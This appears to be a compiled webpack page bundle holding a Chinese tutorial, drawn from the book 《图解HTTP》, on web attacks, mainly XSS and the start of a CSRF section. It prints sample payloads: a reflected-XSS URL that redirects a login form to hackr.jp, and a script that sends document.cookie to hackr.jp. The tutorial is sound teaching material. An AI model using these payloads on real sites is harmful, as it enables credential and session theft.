(window.webpackJsonp=window.webpackJsonp||[]).push([[12],{358:function(t,a,s){"use strict";s.r(a);var n=s(43),e=Object(n.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"认识http-web安全与攻击手段"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#认识http-web安全与攻击手段"}},[t._v("#")]),t._v(" 认识HTTP----Web安全与攻击手段")]),t._v(" "),s("p",[s("strong",[t._v("本文内容大多参考"),s("a",{attrs:{href:"https://book.douban.com/subject/25863515/",target:"_blank",rel:"noopener noreferrer"}},[t._v("《图解HTTP》一书"),s("OutboundLink")],1)])]),t._v(" "),s("h2",{attrs:{id:"关于web的攻击手段"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#关于web的攻击手段"}},[t._v("#")]),t._v(" 关于Web的攻击手段")]),t._v(" "),s("p",[t._v("目前，互联网攻击大多是针对应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源，本文主要针对Web应用的攻击技术进行简单分析。")]),t._v(" "),s("h3",{attrs:{id:"针对web应用的攻击模式"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#针对web应用的攻击模式"}},[t._v("#")]),t._v(" 针对Web应用的攻击模式")]),t._v(" "),s("p",[t._v("对Web应用的攻击模式有以下两种。")]),t._v(" "),s("ul",[s("li",[t._v("主动攻击\n主动攻击（active attack）是指攻击者通过直接访问Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。")])]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-3b2645de43c3de0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:"这个攻击者没法吐槽"}})]),t._v(" "),s("ul",[s("li",[t._v("被动攻击\n被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标Web 应用访问发起攻击。\n被动攻击通常的攻击模式如下所示。")])]),t._v(" "),s("ol",[s("li",[t._v("攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的HTTP 请求。")]),t._v(" "),s("li",[t._v("当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。")]),t._v(" "),s("li",[t._v("中招后的用户浏览器会把含有攻击代码的HTTP 请求发送给作为攻击目标的Web 应用，运行攻击代码。")]),t._v(" "),s("li",[t._v("执行完攻击代码，存在安全漏洞的Web 应用会成为攻击者的跳板，可能导致用户所持的Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。被动攻击模式中具有代表性的攻击是跨站脚本攻击（xss）和跨站点请求伪造（CSRF/XSRF）。")])]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-72423c77abb5909d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:""}})]),t._v(" "),s("h3",{attrs:{id:"因输出值转义不完全引发的安全漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#因输出值转义不完全引发的安全漏洞"}},[t._v("#")]),t._v(" 因输出值转义不完全引发的安全漏洞")]),t._v(" "),s("p",[t._v("实施Web 应用的安全对策可大致分为以下两部分。")]),t._v(" "),s("ul",[s("li",[t._v("客户端验证")]),t._v(" "),s("li",[t._v("Web应用端（服务器）验证\n"),s("ul",[s("li",[t._v("输入值验证")]),t._v(" "),s("li",[t._v("输出值转义")])])])]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-511ebfb85ffa5947.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:""}})]),t._v(" "),s("p",[t._v("多数情况下采用JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭JavaScript，不适合将JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高UI 体验的作用。\nWeb 应用端的输入值验证按Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。\n从数据库或文件系统、HTML、邮件等输出Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。")]),t._v(" "),s("h2",{attrs:{id:"跨站脚本攻击（xss）"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#跨站脚本攻击（xss）"}},[t._v("#")]),t._v(" 跨站脚本攻击（XSS）")]),t._v(" "),s("p",[t._v("跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript的一种攻击。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。\n跨站脚本攻击有可能造成以下影响：")]),t._v(" "),s("ul",[s("li",[t._v("利用虚假输入表单骗取用户个人信息。")]),t._v(" "),s("li",[t._v("利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。")]),t._v(" "),s("li",[t._v("显示伪造的文章或图片（莫名其妙的广告）。")])]),t._v(" "),s("h3",{attrs:{id:"简单例子"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#简单例子"}},[t._v("#")]),t._v(" 简单例子")]),t._v(" "),s("p",[s("strong",[t._v("在动态生成HTML处发生：")])]),t._v(" "),s("p",[t._v("下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-f42a8f9323739e75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:"跨站脚本攻击案例"}})]),t._v(" "),s("p",[t._v("确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口\n一郎这样的HTML 标签的字符串。")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-ec25584204f71ee4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:"按照输入内容原样显示的机制"}})]),t._v(" "),s("p",[t._v("此时的确认界面上，浏览器会把用户输入的"),s("code",[t._v("<s>")]),t._v(" 解析成HTML 标签，然后显示删除线。\n删除线显示出来并不会造成太大的不利后果，但如果换成使用script 标签将会如何呢。")]),t._v(" "),s("h2",{attrs:{id:"xss-是攻击者利用预先设置的陷阱触发的被动攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#xss-是攻击者利用预先设置的陷阱触发的被动攻击"}},[t._v("#")]),t._v(" XSS 是攻击者利用预先设置的陷阱触发的被动攻击")]),t._v(" "),s("p",[t._v("跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。\n下图网站通过地址栏中URI 的查询字段指定ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-23e6fa19d23f219e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:""}}),t._v("\n充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web 页面内，诱使用户去点击该URL。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v('http://example.jp/login?ID="><script>var+f=document⇒\n.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method=⇒\n"get";<\/script><span+s="\n')])])]),s("p",[t._v("浏览器打开该URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID 和密码之后，就会直接发送到攻击者的网站（也就是hackr.jp），导致个人登录信息被窃取。")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-d9c24bd7a2426f2b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:""}})]),t._v(" "),s("p",[t._v("之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。")]),t._v(" "),s("p",[s("strong",[t._v("对 http://example.jp/login?ID=yama 请求时对应的HTML源代码（摘录）")])]),t._v(" "),s("div",{staticClass:"language-html extra-class"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("class")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("logo"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n![](/img/logo.gif)\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("action")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://example.jp/login"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("method")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("post"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("login"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("class")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("input_id"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\nID "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("ID"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("yama"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("div",{staticClass:"language-html extra-class"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[t._v('**http://example.jp/login?ID=">'),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),s("span",{pre:!0,attrs:{class:"token script"}},[s("span",{pre:!0,attrs:{class:"token language-javascript"}},[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("f"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("document"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getElementById")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"login"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("action"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://hackr.jp/pwget"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("method"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"get"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])])]),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('\n<span+s="对请求时对应的HTML源代码（摘录）**\n')])])]),s("div",{staticClass:"language-html extra-class"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("class")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("logo"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n![](/img/logo.gif)\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("action")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://example.jp/login"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("method")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("post"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("login"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("class")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("input_id"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\nID "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("text"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("ID"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("script")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),s("span",{pre:!0,attrs:{class:"token script"}},[s("span",{pre:!0,attrs:{class:"token language-javascript"}},[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" f"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("document⇒\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getElementById")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"login"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("action"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://hackr.jp/pwget"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("method"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("⇒\n"),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"get"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])])]),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("script")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("span")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("s")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("h3",{attrs:{id:"对用户cookie的窃取攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#对用户cookie的窃取攻击"}},[t._v("#")]),t._v(" 对用户Cookie的窃取攻击")]),t._v(" "),s("p",[t._v("除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的Cookie 信息。\n"),s("code",[t._v("<script src=http://hackr.jp/xss.js><\/script>")]),t._v("\n该脚本内指定的http://hackr.jp/xss.js 文件。即下面这段采用JavaScript 编写的代码。")]),t._v(" "),s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" content "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("escape")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("document"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\ndocument"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"<img src=http://hackr.jp/?"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\ndocument"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("content"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\ndocument"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("write")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('">"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),s("p",[t._v("在存在可跨站脚本攻击安全漏洞的Web 应用上执行上面这段JavaScript 程序，即可访问到该Web 应用所处域名下的Cookie 信息。然后这些信息会发送至攻击者的Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-73e389217a5eca2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:"使用XSS 攻击夺取Cookie 信息"}})]),t._v(" "),s("h2",{attrs:{id:"跨站点请求伪造-csrf"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#跨站点请求伪造-csrf"}},[t._v("#")]),t._v(" 跨站点请求伪造(CSRF)")]),t._v(" "),s("p",[t._v("跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。\n跨站点请求伪造有可能会造成以下等影响。")]),t._v(" "),s("ul",[s("li",[t._v("利用已通过认证的用户权限更新设定信息等")]),t._v(" "),s("li",[t._v("利用已通过认证的用户权限购买商品")]),t._v(" "),s("li",[t._v("利用已通过认证的用户权限在留言板上发表言论")])]),t._v(" "),s("h3",{attrs:{id:"跨站点请求伪造的攻击案例"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#跨站点请求伪造的攻击案例"}},[t._v("#")]),t._v(" 跨站点请求伪造的攻击案例")]),t._v(" "),s("p",[t._v("下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。")]),t._v(" "),s("p",[s("img",{attrs:{src:"http://upload-images.jianshu.io/upload_images/4337988-aa8130ff059c20c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240",alt:"跨站点请求伪造的攻击案例"}})]),t._v(" "),s("p",[t._v("在该留言板系统上，受害者用户A 是已认证状态。它的浏览器中的Cookie 持有已认证的会话ID（步骤①）\n攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A 的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论（步骤②）。\n触发陷阱之际，如果用户A 尚未通过认证，则无法利用用户A 的身份权限在留言板上发表内容。")])])}),[],!1,null,null,null);a.default=e.exports}}]);